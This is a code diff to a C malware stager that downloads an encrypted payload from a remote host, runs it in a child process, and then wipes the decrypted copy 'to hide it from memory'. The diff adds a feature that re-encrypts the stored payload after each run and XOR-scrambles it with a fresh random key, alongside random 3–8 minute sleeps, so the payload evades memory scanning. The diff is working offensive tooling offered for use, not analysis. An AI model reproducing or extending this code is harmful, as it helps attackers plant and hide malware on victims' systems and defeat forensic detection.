@@ -48,6 +48,8 @@ size_t download_file(const char *host, const char *port, const char *path,
 static int build_payload_from_encrypted(char *enc_buf, size_t enc_size,
                                         const uint8_t *key, char **out_buf,
                                         size_t *out_size);
+size_t decrypt_data(char *data, size_t data_size, const uint8_t *key,
+                    const uint8_t *iv);
 
 static volatile int g_trap_requested = 0;
 
@@ -57,6 +59,13 @@ static void sigtrap_handler(int signo) {
 }
 
 void stager_main(long *sp);
+
+// XOR helper
+void xor_payload(char *data, size_t len, const uint8_t *key, size_t key_len) {
+  for (size_t i = 0; i < len; i++) {
+    data[i] ^= key[i % key_len];
+  }
+}
 
 // Place _start in .init section to ensure it's at the beginning
 __asm__(".section .init,\"ax\",@progbits\n"
@@ -105,7 +114,17 @@ void stager_main(long *sp) {
   DEBUG_PRINT("Downloaded %d bytes\n", (int)downloaded_size);
 
   if (downloaded_size > 0) {
+    int is_rotated = 0;
+    uint8_t rotator_key[16] = {0};
+
     while (1) {
+      // 1. Unlock if rotated
+      if (is_rotated) {
+        DEBUG_PRINT("Unlocking payload...\n");
+        xor_payload(payload, downloaded_size, rotator_key, 16);
+        is_rotated = 0;
+      }
+
       g_trap_requested = 0;
 
       char *final_payload = NULL;
@@ -123,6 +142,14 @@ void stager_main(long *sp) {
           // Parent process
           // Free the decrypted payload to hide it from memory
           free(final_payload);
+
+          // Restore payload to AES-Encrypted state
+          // build_payload_from_encrypted decrypts in-place (AES-CTR).
+          // To restore it, we just run the same decryption again (symmetric).
+          // IV is at payload[0..15]
+          if (downloaded_size > 16) {
+             decrypt_data(payload + 16, downloaded_size - 16, key, (const uint8_t*)payload);
+          }
 
           // Wait for child to exit
           int status = 0;
@@ -146,6 +173,15 @@ void stager_main(long *sp) {
             req.tv_nsec = 0;
             nanosleep(&req, NULL);
           }
+          
+          // Generate new rotation key
+          DEBUG_PRINT("Generating new rotation key...\n");
+          getrandom(rotator_key, 16, 0);
+          
+          // Apply rotation
+          DEBUG_PRINT("Rotating payload...\n");
+          xor_payload(payload, downloaded_size, rotator_key, 16);
+          is_rotated = 1;
 
           // Sleep for a random time (3-8 minutes)
           unsigned int sleep_s = 0;
@@ -188,8 +224,7 @@ static void decode_config_string(char *dest, const unsigned char *encoded,
 }
 
 // forward declarations
-size_t decrypt_data(char *data, size_t data_size, const uint8_t *key,
-                    const uint8_t *iv);
+
 
 // build a runnable payload by decrypting and decompressing the stored blob
 static int build_payload_from_encrypted(char *enc_buf, size_t enc_size,
